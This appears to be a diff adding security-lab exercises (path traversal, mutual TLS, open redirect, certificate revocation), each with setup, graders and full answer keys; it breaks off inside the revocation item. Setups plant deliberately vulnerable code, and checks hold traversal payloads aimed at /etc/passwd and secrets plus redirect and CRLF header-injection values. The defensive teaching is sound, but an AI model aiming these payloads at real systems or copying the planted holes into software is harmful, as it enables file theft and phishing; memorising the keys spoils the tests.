+        path = os.path.realpath(os.path.join(root, name))
+        if os.path.commonpath([root, path]) != root:
+            return self.reply(403, b"forbidden\n")
+        if not os.path.isfile(path):
+            return self.reply(404, b"no such file\n")
+        with open(path, "rb") as f:
+            self.reply(200, f.read(), "application/octet-stream")
+    ```
+  setup: |
+    rm -rf /lab/app.py /lab/files
+    for f in report.txt sub/readme.txt notes..v2.txt; do
+      mkdir -p "$(dirname "/lab/files/$f")"
+      printf 'content of %s: %s\n' "$f" "$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')" > "/lab/files/$f"
+    done
+    rm -rf "$KL_STATE/files"; cp -r /lab/files "$KL_STATE/files"
+    printf 'SECRET-%s\n' "$(head -c12 /dev/urandom | od -An -tx1 | tr -d ' \n')" > "$KL_STATE/secret.txt"
+    chmod 644 "$KL_STATE/secret.txt"
+    lab_file /lab/app.py <<'PY'
+    import os
+    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+    from urllib.parse import urlsplit, parse_qs, unquote
+
+    FILES = os.path.join(os.path.dirname(os.path.abspath(__file__)), "files")
+
+
+    class H(BaseHTTPRequestHandler):
+        def reply(self, code, data, ctype="text/plain; charset=utf-8"):
+            self.send_response(code)
+            self.send_header("Content-Type", ctype)
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
+
+        def do_GET(self):
+            url = urlsplit(self.path)
+            if url.path == "/":
+                return self.reply(200, b"Acme downloads: /download?name=report.txt\n")
+            if url.path != "/download":
+                return self.reply(404, b"not found\n")
+            name = parse_qs(url.query).get("name", [""])[0]
+            name = name.replace("../", "")   # no climbing out of files/
+            name = unquote(name)             # some clients encode twice
+            try:
+                with open(os.path.join(FILES, name), "rb") as f:
+                    data = f.read()
+            except OSError:
+                return self.reply(404, b"no such file\n")
+            self.reply(200, data, "application/octet-stream")
+
+        def log_message(self, *args):
+            pass
+
+
+    ThreadingHTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8000"))), H).serve_forever()
+    PY
+    chown -R "$(lab_user):" /lab
+  check: |
+    B=http://127.0.0.1:8090
+    secret=$(cat "$KL_STATE/secret.txt")
+    docker rm -f kl-chk >/dev/null 2>&1
+    docker run -d --name kl-chk -p 127.0.0.1:8090:8000 -e PORT=8000 -v /lab/app.py:/app/app.py:ro \
+      -v /lab/files:/app/files:ro -v "$KL_STATE/secret.txt:/app/secret.txt:ro" \
+      python:3.12-alpine python /app/app.py >/dev/null 2>&1
+    check "your app.py starts" 'eventually 15 "curl -s -o /dev/null -m 2 $B/"'
+    for q in /etc/passwd /app/secret.txt '....//secret.txt' 'sub/....//....//secret.txt' \
+             '%252e%252e%252fsecret.txt' '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd' \
+             '....//....//....//etc/passwd' '..%2f..%2f..%2fetc%2fpasswd' '..'; do
+      c=$(curl -s -m 5 -o "$KL_STATE/out" -w '%{http_code}' "$B/download?name=$q")
+      check "name=$q is refused with a 4xx (got $c) and leaks nothing" \
+        '[[ "$c" =~ ^4[0-9][0-9]$ ]] && ! grep -qF "$secret" "$KL_STATE/out" && ! grep -q "root:x:0:0" "$KL_STATE/out"'
+    done
+    for f in report.txt sub/readme.txt notes..v2.txt; do
+      check "$f is still served" 'curl -fs -m 5 "$B/download?name=$f" | cmp -s - "$KL_STATE/files/$f"'
+    done
+    check "an encoded name inside files/ is served" 'curl -fs -m 5 "$B/download?name=sub%2Freadme.txt" | cmp -s - "$KL_STATE/files/sub/readme.txt"'
+    rm -f "$KL_STATE/out"
+    docker rm -f kl-chk >/dev/null 2>&1
+  solve: |
+    cat > /lab/app.py <<'PY'
+    import os
+    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+    from urllib.parse import urlsplit, parse_qs
+
+    FILES = os.path.join(os.path.dirname(os.path.abspath(__file__)), "files")
+
+
+    class H(BaseHTTPRequestHandler):
+        def reply(self, code, data, ctype="text/plain; charset=utf-8"):
+            self.send_response(code)
+            self.send_header("Content-Type", ctype)
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
+
+        def do_GET(self):
+            url = urlsplit(self.path)
+            if url.path == "/":
+                return self.reply(200, b"Acme downloads: /download?name=report.txt\n")
+            if url.path != "/download":
+                return self.reply(404, b"not found\n")
+            name = parse_qs(url.query).get("name", [""])[0]
+            root = os.path.realpath(FILES)
+            path = os.path.realpath(os.path.join(root, name))
+            if os.path.commonpath([root, path]) != root:
+                return self.reply(403, b"forbidden\n")
+            if not os.path.isfile(path):
+                return self.reply(404, b"no such file\n")
+            with open(path, "rb") as f:
+                self.reply(200, f.read(), "application/octet-stream")
+
+        def log_message(self, *args):
+            pass
+
+
+    ThreadingHTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8000"))), H).serve_forever()
+    PY
+
+- id: sec-086
+  title: Only clients with a certificate
+  difficulty: 4
+  kind: build
+  tags: [tls, mtls, pki, nginx, openssl, access-management]
+  tutorial: |
+    **Concept.** In **mutual TLS** the server also asks the client for a
+    certificate and accepts only those signed by a CA it trusts for clients.
+    A stolen password is no longer enough: the attacker also needs a private
+    key that never left the client. Keep the **client CA separate** from the
+    CA that signs servers. If the same CA does both, every server certificate
+    is also a valid client credential. Client certificates carry
+    `extendedKeyUsage = clientAuth`.
+
+    **Read up on:**
+    - nginx `ssl_client_certificate`, `ssl_verify_client`, `ssl_verify_depth`
+    - `extendedKeyUsage` `clientAuth` vs `serverAuth`
+    - `curl --cert FILE --key FILE`
+  scenario: |
+    **`kl-web`** serves the operations API on HTTPS at
+    **`https://web.lab.test:8443/`** (reach it with
+    `--resolve web.lab.test:8443:127.0.0.1`; its certificate is signed by
+    **`/lab/pki/server-ca.crt`**). Configuration: **`/lab/nginx/default.conf`**
+    (mounted at `/etc/nginx/conf.d`). You hold a separate CA for clients:
+    **`/lab/pki/clients-ca.crt`** and **`/lab/pki/clients-ca.key`** (a copy of
+    the certificate is already in `/lab/nginx/tls/`).
+
+    - issue **`/lab/pki/ops.key`** and **`/lab/pki/ops.crt`**: subject
+      `CN=ops`, signed by the clients CA, `extendedKeyUsage` **clientAuth**,
+      not a CA
+    - make `kl-web` **require** a client certificate signed by the clients
+      CA on every HTTPS request: with `ops.crt` the page loads (200); with no
+      certificate, or one signed by **any other CA** (including the server
+      CA), the answer is not 200
+
+    The check restarts `kl-web` with your configuration and uses `curl
+    --cacert /lab/pki/server-ca.crt`.
+  hints:
+    - "Key and CSR: `openssl req -new -newkey rsa:2048 -nodes -keyout ops.key -out ops.csr -subj /CN=ops`."
+    - "Sign with an extension file holding `basicConstraints=CA:FALSE`, `keyUsage=critical,digitalSignature` and `extendedKeyUsage=clientAuth`: `openssl x509 -req -in ops.csr -CA clients-ca.crt -CAkey clients-ca.key -CAcreateserial -days 90 -extfile client.ext -out ops.crt`."
+    - "In the `listen 443` server: `ssl_client_certificate /etc/nginx/conf.d/tls/clients-ca.crt;` and `ssl_verify_client on;`. Without a valid certificate nginx answers 400."
+    - "Test: `curl --cacert /lab/pki/server-ca.crt --resolve web.lab.test:8443:127.0.0.1 --cert /lab/pki/ops.crt --key /lab/pki/ops.key https://web.lab.test:8443/`."
+  solution: |
+    ```bash
+    cd /lab/pki
+    openssl req -new -newkey rsa:2048 -nodes -keyout ops.key -out ops.csr -subj "/CN=ops"
+    printf 'basicConstraints=CA:FALSE\nkeyUsage=critical,digitalSignature\nextendedKeyUsage=clientAuth\n' > client.ext
+    openssl x509 -req -in ops.csr -CA clients-ca.crt -CAkey clients-ca.key -CAcreateserial \
+      -days 90 -extfile client.ext -out ops.crt
+    ```
+    ```nginx
+    server {
+        listen 443 ssl;
+        ...
+        ssl_client_certificate /etc/nginx/conf.d/tls/clients-ca.crt;
+        ssl_verify_client on;
+    }
+    ```
+    ```bash
+    docker exec kl-web nginx -s reload
+    curl --cacert server-ca.crt --resolve web.lab.test:8443:127.0.0.1 --cert ops.crt --key ops.key https://web.lab.test:8443/
+    ```
+  setup: |
+    rm -rf /lab/nginx /lab/pki
+    mkdir -p /lab/nginx/html /lab/nginx/tls /lab/pki
+    t=$(mktemp -d)
+    tok=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+    echo "$tok" > "$KL_STATE/tok"
+    # the server CA: its key stays with root
+    openssl req -x509 -newkey rsa:2048 -nodes -keyout "$KL_STATE/server-ca.key" -out /lab/pki/server-ca.crt \
+      -days 365 -subj "/CN=Lab Server CA" 2>/dev/null
+    openssl req -new -newkey rsa:2048 -nodes -keyout /lab/nginx/tls/web.key -out "$t/web.csr" -subj "/CN=web.lab.test" 2>/dev/null
+    printf 'subjectAltName=DNS:web.lab.test\nbasicConstraints=CA:FALSE\nextendedKeyUsage=serverAuth\n' > "$t/web.ext"
+    openssl x509 -req -in "$t/web.csr" -CA /lab/pki/server-ca.crt -CAkey "$KL_STATE/server-ca.key" \
+      -CAserial "$t/srl" -CAcreateserial -days 90 -extfile "$t/web.ext" -out /lab/nginx/tls/web.crt 2>/dev/null
+    # the clients CA: the learner's to use
+    openssl req -x509 -newkey rsa:2048 -nodes -keyout /lab/pki/clients-ca.key -out /lab/pki/clients-ca.crt \
+      -days 365 -subj "/CN=Lab Clients CA" 2>/dev/null
+    cp /lab/pki/clients-ca.crt /lab/nginx/tls/clients-ca.crt
+    rm -rf "$t"
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        return 301 https://web.lab.test:8443$request_uri;
+    }
+
+    server {
+        listen 443 ssl;
+        server_name web.lab.test;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+
+        ssl_certificate     /etc/nginx/conf.d/tls/web.crt;
+        ssl_certificate_key /etc/nginx/conf.d/tls/web.key;
+        ssl_protocols TLSv1.2 TLSv1.3;
+    }
+    EOF
+    printf '<h1>Operations API</h1>\n<p>%s</p>\n' "$tok" > /lab/nginx/html/index.html
+    chown -R "$(lab_user):" /lab
+    docker rm -f kl-web >/dev/null 2>&1 || true
+    docker run -d --name kl-web --restart unless-stopped -e NGINX_ENTRYPOINT_QUIET_LOGS=1 \
+      -p 127.0.0.1:8080:80 -p 127.0.0.1:8443:443 -v /lab/nginx:/etc/nginx/conf.d:ro nginx:1.27-alpine >/dev/null
+    eventually 20 'curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'
+  check: |
+    tok=$(cat "$KL_STATE/tok")
+    P=/lab/pki
+    web_restart() { docker restart -t 1 kl-web >/dev/null 2>&1; sleep 1; eventually 10 'c_running kl-web && curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'; }
+    mt() { curl -s -m 5 --cacert $P/server-ca.crt --resolve web.lab.test:8443:127.0.0.1 "$@" https://web.lab.test:8443/; }
+    mcode() { mt -o /dev/null -w '%{http_code}' "$@"; }
+    pub() { openssl pkey -in "$1" -pubout 2>/dev/null; }
+    # certificates for CN=ops from a rogue CA and from the server CA
+    d=$(mktemp -d)
+    printf 'basicConstraints=CA:FALSE\nkeyUsage=critical,digitalSignature\nextendedKeyUsage=clientAuth\n' > "$d/c.ext"
+    openssl req -x509 -newkey rsa:2048 -nodes -keyout "$d/rca.key" -out "$d/rca.crt" -days 2 -subj "/CN=Lab Clients CA" 2>/dev/null
+    for who in rogue server; do
+      openssl req -new -newkey rsa:2048 -nodes -keyout "$d/$who.key" -out "$d/$who.csr" -subj "/CN=ops" 2>/dev/null
+    done
+    openssl x509 -req -in "$d/rogue.csr" -CA "$d/rca.crt" -CAkey "$d/rca.key" -CAserial "$d/r.srl" -CAcreateserial \
+      -days 2 -extfile "$d/c.ext" -out "$d/rogue.crt" 2>/dev/null
+    openssl x509 -req -in "$d/server.csr" -CA $P/server-ca.crt -CAkey "$KL_STATE/server-ca.key" -CAserial "$d/s.srl" -CAcreateserial \
+      -days 2 -extfile "$d/c.ext" -out "$d/server.crt" 2>/dev/null
+    check "kl-web starts with your configuration (see docker logs kl-web)" 'web_restart'
+    check "ops.crt has subject CN=ops" 'openssl x509 -in $P/ops.crt -noout -subject | grep -qE "CN ?= ?ops$"'
+    check "ops.crt is signed by the clients CA" 'openssl verify -CAfile $P/clients-ca.crt $P/ops.crt'
+    check "ops.crt is for client authentication" 'openssl x509 -in $P/ops.crt -noout -ext extendedKeyUsage | grep -q "TLS Web Client Authentication"'
+    check "ops.crt is not a CA" '[ -s $P/ops.crt ] && ! openssl x509 -in $P/ops.crt -noout -text | grep -q "CA:TRUE"'
+    check "ops.key belongs to ops.crt" 'k=$(pub $P/ops.key) && [ -n "$k" ] && [ "$k" = "$(openssl x509 -in $P/ops.crt -noout -pubkey)" ]'
+    check "with ops.crt the API answers" 'mt -f --cert $P/ops.crt --key $P/ops.key | grep -qF "$tok"'
+    c=$(mcode); check "without a client certificate: refused (got $c)" '[ "$c" != 200 ]'
+    c=$(mcode --cert "$d/rogue.crt" --key "$d/rogue.key"); check "a certificate from another CA: refused (got $c)" '[ "$c" != 200 ]'
+    c=$(mcode --cert "$d/server.crt" --key "$d/server.key"); check "a certificate from the server CA: refused (got $c)" '[ "$c" != 200 ]'
+    rm -rf "$d"
+  solve: |
+    cd /lab/pki
+    openssl req -new -newkey rsa:2048 -nodes -keyout ops.key -out ops.csr -subj "/CN=ops" 2>/dev/null
+    printf 'basicConstraints=CA:FALSE\nkeyUsage=critical,digitalSignature\nextendedKeyUsage=clientAuth\n' > client.ext
+    openssl x509 -req -in ops.csr -CA clients-ca.crt -CAkey clients-ca.key -CAcreateserial \
+      -days 90 -extfile client.ext -out ops.crt 2>/dev/null
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        return 301 https://web.lab.test:8443$request_uri;
+    }
+
+    server {
+        listen 443 ssl;
+        server_name web.lab.test;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+
+        ssl_certificate     /etc/nginx/conf.d/tls/web.crt;
+        ssl_certificate_key /etc/nginx/conf.d/tls/web.key;
+        ssl_protocols TLSv1.2 TLSv1.3;
+
+        ssl_client_certificate /etc/nginx/conf.d/tls/clients-ca.crt;
+        ssl_verify_client on;
+    }
+    EOF
+    docker exec kl-web nginx -s reload
+
+- id: sec-087
+  title: The redirect that goes anywhere
+  difficulty: 4
+  kind: fix
+  tags: [web, open-redirect, python, input-validation]
+  tutorial: |
+    **Concept.** "Return to where you were" links (`/continue?next=/orders`)
+    become an **open redirect** when `next` may point off-site: a phishing
+    mail links to the real domain, which bounces the victim to the
+    attacker's look-alike. Checking `startswith("/")` is the usual broken
+    fix. Browsers read `//evil.test` as a scheme-relative URL, treat `\`
+    like `/`, and strip tabs and newlines out of URLs, so `/\evil.test` and
+    `/<TAB>/evil.test` leave the site too. Control characters in a header
+    value are worse still: a CR LF lets the attacker add headers of their own.
+    Accept only a **local path** (a single leading `/`, no backslashes, no
+    control characters, no scheme or host after parsing) and send anything
+    else to a safe default.
+
+    **Read up on:**
+    - OWASP Unvalidated Redirects and Forwards
+    - `urllib.parse.urlsplit` (`scheme`, `netloc`)
+    - How browsers parse `//host`, `/\host` and whitespace in URLs; HTTP response splitting
+  scenario: |
+    **`/lab/app.py`** (Python standard library; try it with
+    `PORT=8000 python3 /lab/app.py`) answers **`GET /continue?next=...`**
+    with a **302** to `next`. It only checks that `next` starts with `/`.
+    Fix it:
+
+    - a local path keeps working, query string included: `next=/dashboard`
+      → `Location: /dashboard`; `next=/reports?id=3&tab=2` (URL-encoded in the
+      query) → `Location: /reports?id=3&tab=2`
+    - anything that could leave the site, or that contains a backslash or a
+      control character, redirects to exactly **`/`**. The check tries
+      `https://evil.test/`, `//evil.test/`, `///evil.test`, `/\evil.test/`,
+      `/<TAB>/evil.test`, `javascript:alert(1)`, and a value with CR LF
+      followed by a header of its own (which must never show up as a
+      response header)
+    - the answer is always a **302**
+
+    The check runs your `/lab/app.py` in a fresh `python:3.12-alpine`
+    container.
+  hints:
+    - "`curl -si 'http://127.0.0.1:8000/continue?next=%2F%2Fevil.test%2F'` shows `Location: //evil.test/`, which a browser follows off-site."
+    - "Write a `safe_next(n)` that returns `/` unless `n` starts with exactly one `/` and contains no `\\` and no character below `0x21`, then double-check with `urlsplit(n)`: both `scheme` and `netloc` must be empty."
+    - "`parse_qs` has already decoded `%0d%0a` into a real CR LF. Rejecting control characters is what stops the header injection."
+  solution: |
+    ```python
+    from urllib.parse import urlsplit, parse_qs
+
+    def safe_next(n):
+        if not n or not n.startswith("/") or n.startswith("//"):
+            return "/"
+        if "\\" in n or any(ord(c) < 0x21 or ord(c) == 0x7f for c in n):
+            return "/"
+        p = urlsplit(n)
+        if p.scheme or p.netloc:
+            return "/"
+        return n
+
+    # in do_GET:
+    nxt = safe_next(parse_qs(url.query).get("next", ["/"])[0])
+    ```
+  setup: |
+    rm -f /lab/app.py
+    lab_file /lab/app.py <<'PY'
+    import os
+    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+    from urllib.parse import urlsplit, parse_qs
+
+
+    class H(BaseHTTPRequestHandler):
+        def do_GET(self):
+            url = urlsplit(self.path)
+            if url.path == "/continue":
+                nxt = parse_qs(url.query).get("next", ["/"])[0]
+                if not nxt.startswith("/"):
+                    nxt = "/"
+                self.send_response(302)
+                self.send_header("Location", nxt)
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+                return
+            body = b"Acme portal\n" if url.path == "/" else b"not found\n"
+            self.send_response(200 if url.path == "/" else 404)
+            self.send_header("Content-Type", "text/plain")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+
+        def log_message(self, *args):
+            pass
+
+
+    ThreadingHTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8000"))), H).serve_forever()
+    PY
+  check: |
+    B=http://127.0.0.1:8090
+    docker rm -f kl-chk >/dev/null 2>&1
+    docker run -d --name kl-chk -p 127.0.0.1:8090:8000 -e PORT=8000 -v /lab/app.py:/app/app.py:ro \
+      python:3.12-alpine python /app/app.py >/dev/null 2>&1
+    check "your app.py starts" 'eventually 15 "curl -s -o /dev/null -m 2 $B/"'
+    # go ENCODED-NEXT -> "STATUS LOCATION", and the raw headers in $KL_STATE/h
+    go() {
+      curl -s -m 5 -o /dev/null -D "$KL_STATE/h" "$B/continue?next=$1" >/dev/null 2>&1
+      printf '%s %s' "$(head -1 "$KL_STATE/h" | awk '{print $2}')" \
+        "$(tr -d '\r' < "$KL_STATE/h" | grep -i '^location:' | head -1 | cut -d: -f2- | sed 's/^ *//')"
+    }
+    check_eq "next=/dashboard" "$(go %2Fdashboard)" "302 /dashboard"
+    check_eq "next=/reports?id=3&tab=2" "$(go '%2Freports%3Fid%3D3%26tab%3D2')" "302 /reports?id=3&tab=2"
+    for n in 'https%3A%2F%2Fevil.test%2F' '%2F%2Fevil.test%2F' '%2F%2F%2Fevil.test' '%2F%5Cevil.test%2F' \
+             '%2F%09%2Fevil.test' 'javascript%3Aalert(1)' '%2Fok%0D%0AX-Injected%3A%201'; do
+      check_eq "next=$n goes to /" "$(go "$n")" "302 /"
+    done
+    go '%2Fok%0D%0AX-Injected%3A%201' >/dev/null
+    check_not "no header can be injected" 'tr -d "\r" < "$KL_STATE/h" | grep -qi "^x-injected:"'
+    rm -f "$KL_STATE/h"
+    docker rm -f kl-chk >/dev/null 2>&1
+  solve: |
+    cat > /lab/app.py <<'PY'
+    import os
+    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+    from urllib.parse import urlsplit, parse_qs
+
+
+    def safe_next(n):
+        if not n or not n.startswith("/") or n.startswith("//"):
+            return "/"
+        if "\\" in n or any(ord(c) < 0x21 or ord(c) == 0x7f for c in n):
+            return "/"
+        p = urlsplit(n)
+        if p.scheme or p.netloc:
+            return "/"
+        return n
+
+
+    class H(BaseHTTPRequestHandler):
+        def do_GET(self):
+            url = urlsplit(self.path)
+            if url.path == "/continue":
+                nxt = safe_next(parse_qs(url.query).get("next", ["/"])[0])
+                self.send_response(302)
+                self.send_header("Location", nxt)
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+                return
+            body = b"Acme portal\n" if url.path == "/" else b"not found\n"
+            self.send_response(200 if url.path == "/" else 404)
+            self.send_header("Content-Type", "text/plain")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+
+        def log_message(self, *args):
+            pass
+
+
+    ThreadingHTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8000"))), H).serve_forever()
+    PY
+
+- id: sec-088
+  title: Revoke the stolen client certificate
+  difficulty: 5
+  kind: build
+  tags: [tls, pki, crl, mtls, nginx, openssl, incident-response]
+  tutorial: |
+    **Concept.** A certificate stays valid until it expires, even after its
+    private key is stolen. **Revocation** is the CA saying "not this one any
+    more". `openssl ca` keeps a small database (`index.txt`: one line per
+    issued certificate, `V` valid or `R` revoked, with the serial number).
+    `-revoke` marks a certificate revoked, and `-gencrl` publishes a signed
+    **Certificate Revocation List** that relying parties load. nginx checks
+    client certificates against it with `ssl_crl`. A CRL has a `nextUpdate`
+    date; one that is past it is rejected, so CRLs are re-issued on a
+    schedule. The user then gets a new certificate for a **new** key.
+
+    **Read up on:**
+    - `openssl ca -revoke CERT -crl_reason keyCompromise`, `openssl ca -gencrl`
+    - The `index.txt` format; `openssl crl -text`, `-CAfile`
+    - nginx `ssl_crl`
+  scenario: |
+    **`kl-web`** (`https://web.lab.test:8443/`, reach it with
+    `--resolve web.lab.test:8443:127.0.0.1` and `--cacert
+    /lab/pki/server-ca.crt`; configuration **`/lab/nginx/default.conf`**,
+    mounted at `/etc/nginx/conf.d`) already requires client certificates from
+    the clients CA in **`/lab/pki/ca/`**, run with `openssl ca -config
+    /lab/pki/ca/openssl.cnf`. It issued **`/lab/pki/alice.crt`** and
+    **`/lab/pki/bob.crt`**. Bob's laptop was stolen with **`/lab/pki/bob.key`**
+    on it.
+
+    - **revoke** `bob.crt` in the CA database with reason **keyCompromise**
+    - publish a CRL signed by the clients CA, listing it, at
+      **`/lab/nginx/tls/clients.crl`** (PEM), and make `kl-web` enforce it:
+      `bob.crt` is refused (not 200), `alice.crt` still gets the page (200)
+    - issue Bob a replacement from the same CA: **`/lab/pki/bob-new.key`**
+      (a **new** key) and **`/lab/pki/bob-new.crt`** (`CN=bob`), which gets the
+      page (200)
+
+    The check restarts `kl-web` with your configuration.
+  hints:
+    - "`grep bob /lab/pki/ca/index.txt` shows Bob's serial. `openssl ca -config /lab/pki/ca/openssl.cnf -revoke /lab/pki/bob.crt -crl_reason keyCompromise` marks it `R`."
+    - "`openssl ca -config /lab/pki/ca/openssl.cnf -gencrl -out /lab/nginx/tls/clients.crl`, then `openssl crl -in /lab/nginx/tls/clients.crl -noout -text` to see the revoked serial."
+    - "Add `ssl_crl /etc/nginx/conf.d/tls/clients.crl;` next to `ssl_verify_client on;`. A revoked certificate gets a 400."
+    - "New key and CSR with `openssl req -new -newkey rsa:2048 -nodes -keyout /lab/pki/bob-new.key -subj /CN=bob ...`, then `openssl ca -batch -notext -config ... -in bob-new.csr -out /lab/pki/bob-new.crt`."
+  solution: |
+    ```bash
+    CA="openssl ca -config /lab/pki/ca/openssl.cnf"
+    $CA -revoke /lab/pki/bob.crt -crl_reason keyCompromise
+    $CA -gencrl -out /lab/nginx/tls/clients.crl
+    openssl crl -in /lab/nginx/tls/clients.crl -noout -text | grep -A1 'Serial Number'
+
+    openssl req -new -newkey rsa:2048 -nodes -keyout /lab/pki/bob-new.key -out /lab/pki/bob-new.csr -subj "/CN=bob"
+    $CA -batch -notext -in /lab/pki/bob-new.csr -out /lab/pki/bob-new.crt
+    ```
+    ```nginx
+    ssl_client_certificate /etc/nginx/conf.d/tls/clients-ca.crt;
+    ssl_verify_client on;
+    ssl_crl /etc/nginx/conf.d/tls/clients.crl;
+    ```
+    ```bash
+    docker exec kl-web nginx -s reload
+    for u in alice bob bob-new; do
+      curl -s -o /dev/null -w "$u %{http_code}\n" --cacert /lab/pki/server-ca.crt --resolve web.lab.test:8443:127.0.0.1 \
+        --cert /lab/pki/$u.crt --key /lab/pki/$u.key https://web.lab.test:8443/
+    done
+    ```
+  setup: |
+    rm -rf /lab/nginx /lab/pki
+    mkdir -p /lab/nginx/html /lab/nginx/tls /lab/pki/ca/newcerts
+    t=$(mktemp -d)
+    tok=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+    echo "$tok" > "$KL_STATE/tok"
+    # the server side: its CA key stays with root
+    openssl req -x509 -newkey rsa:2048 -nodes -keyout "$t/server-ca.key" -out /lab/pki/server-ca.crt \
+      -days 365 -subj "/CN=Lab Server CA" 2>/dev/null
+    openssl req -new -newkey rsa:2048 -nodes -keyout /lab/nginx/tls/web.key -out "$t/web.csr" -subj "/CN=web.lab.test" 2>/dev/null
+    printf 'subjectAltName=DNS:web.lab.test\nbasicConstraints=CA:FALSE\nextendedKeyUsage=serverAuth\n' > "$t/web.ext"
+    openssl x509 -req -in "$t/web.csr" -CA /lab/pki/server-ca.crt -CAkey "$t/server-ca.key" \
+      -CAserial "$t/srl" -CAcreateserial -days 90 -extfile "$t/web.ext" -out /lab/nginx/tls/web.crt 2>/dev/null
+    # the clients CA, with an openssl ca database
+    cat > /lab/pki/ca/openssl.cnf <<'EOF'
+    [ ca ]
+    default_ca = clients_ca
+
+    [ clients_ca ]
+    dir              = /lab/pki/ca
+    database         = $dir/index.txt
+    new_certs_dir    = $dir/newcerts
+    certificate      = $dir/ca.crt
+    private_key      = $dir/ca.key
+    serial           = $dir/serial
+    crlnumber        = $dir/crlnumber
+    default_md       = sha256
+    default_days     = 365
+    default_crl_days = 30
+    policy           = policy_any
+    unique_subject   = no
+    copy_extensions  = none
+    x509_extensions  = client_cert
+
+    [ policy_any ]
+    commonName = supplied
+
+    [ client_cert ]
+    basicConstraints = critical, CA:FALSE
+    keyUsage         = critical, digitalSignature
+    extendedKeyUsage = clientAuth
+    EOF
+    : > /lab/pki/ca/index.txt
+    printf '%X\n' $((0x1000 + RANDOM % 0x7000)) > /lab/pki/ca/serial
+    echo 1000 > /lab/pki/ca/crlnumber
+    openssl req -x509 -newkey rsa:2048 -nodes -keyout /lab/pki/ca/ca.key -out /lab/pki/ca/ca.crt \
+      -days 365 -subj "/CN=Lab Clients CA" 2>/dev/null
+    for u in alice bob; do
+      openssl req -new -newkey rsa:2048 -nodes -keyout "/lab/pki/$u.key" -out "$t/$u.csr" -subj "/CN=$u" 2>/dev/null
+      openssl ca -batch -notext -config /lab/pki/ca/openssl.cnf -in "$t/$u.csr" -out "/lab/pki/$u.crt" 2>/dev/null
+    done
+    cp /lab/pki/ca/ca.crt /lab/nginx/tls/clients-ca.crt
+    openssl x509 -in /lab/pki/bob.crt -noout -serial | cut -d= -f2 > "$KL_STATE/serial"
+    openssl pkey -in /lab/pki/bob.key -pubout > "$KL_STATE/bobpub"
+    rm -rf "$t"
+    cat > /lab/nginx/default.conf <<'EOF'
+    server {
+        listen 80;
+        server_name _;
+        return 301 https://web.lab.test:8443$request_uri;
+    }
+
+    server {
+        listen 443 ssl;
+        server_name web.lab.test;
+        root /etc/nginx/conf.d/html;
+        index index.html;
+
+        ssl_certificate     /etc/nginx/conf.d/tls/web.crt;
+        ssl_certificate_key /etc/nginx/conf.d/tls/web.key;
+        ssl_protocols TLSv1.2 TLSv1.3;
+
+        ssl_client_certificate /etc/nginx/conf.d/tls/clients-ca.crt;
+        ssl_verify_client on;
+    }
+    EOF
+    printf '<h1>Operations API</h1>\n<p>%s</p>\n' "$tok" > /lab/nginx/html/index.html
+    chown -R "$(lab_user):" /lab
+    docker rm -f kl-web >/dev/null 2>&1 || true
+    docker run -d --name kl-web --restart unless-stopped -e NGINX_ENTRYPOINT_QUIET_LOGS=1 \
+      -p 127.0.0.1:8080:80 -p 127.0.0.1:8443:443 -v /lab/nginx:/etc/nginx/conf.d:ro nginx:1.27-alpine >/dev/null
+    eventually 20 'curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'
+  check: |
+    tok=$(cat "$KL_STATE/tok"); serial=$(cat "$KL_STATE/serial")
+    P=/lab/pki CRL=/lab/nginx/tls/clients.crl
+    web_restart() { docker restart -t 1 kl-web >/dev/null 2>&1; sleep 1; eventually 10 'c_running kl-web && curl -s -o /dev/null -m 2 http://127.0.0.1:8080/'; }
+    as() { local u=$1; shift; curl -s -m 5 --cacert $P/server-ca.crt --resolve web.lab.test:8443:127.0.0.1 --cert "$P/$u.crt" --key "$P/$u.key" "$@" https://web.lab.test:8443/; }
+    check "kl-web starts with your configuration (see docker logs kl-web)" 'web_restart'
+    check_eq "bob.crt (serial $serial) is revoked in index.txt" "$(awk -F'\t' -v s="$serial" '$4 == s {print $1}' $P/ca/index.txt 2>/dev/null)" R
+    check "the revocation reason is keyCompromise" 'awk -F"\t" -v s="$serial" "\$4 == s {print \$3}" $P/ca/index.txt | grep -q keyCompromise'
+    check "clients.crl is signed by the clients CA" 'openssl crl -in $CRL -CAfile $P/ca/ca.crt -noout 2>&1 | grep -q "verify OK"'
+    check "clients.crl lists bob's serial" 'openssl crl -in $CRL -noout -text | grep -qE "Serial Number: *$serial\$"'
+    check "the stolen bob.crt is refused" '[ "$(as bob -o /dev/null -w "%{http_code}")" != 200 ]'
+    check "alice.crt still gets the page" 'as alice | grep -qF "$tok"'
+    check "bob-new.crt gets the page" 'as bob-new | grep -qF "$tok"'
+    check "bob-new.crt is CN=bob from the clients CA" 'openssl x509 -in $P/bob-new.crt -noout -subject | grep -qE "CN ?= ?bob$" && openssl verify -CAfile $P/ca/ca.crt $P/bob-new.crt'
+    check "bob-new.key is a new key" 'k=$(openssl pkey -in $P/bob-new.key -pubout 2>/dev/null) && [ -n "$k" ] && [ "$k" != "$(cat "$KL_STATE/bobpub")" ]'
+  solve: |
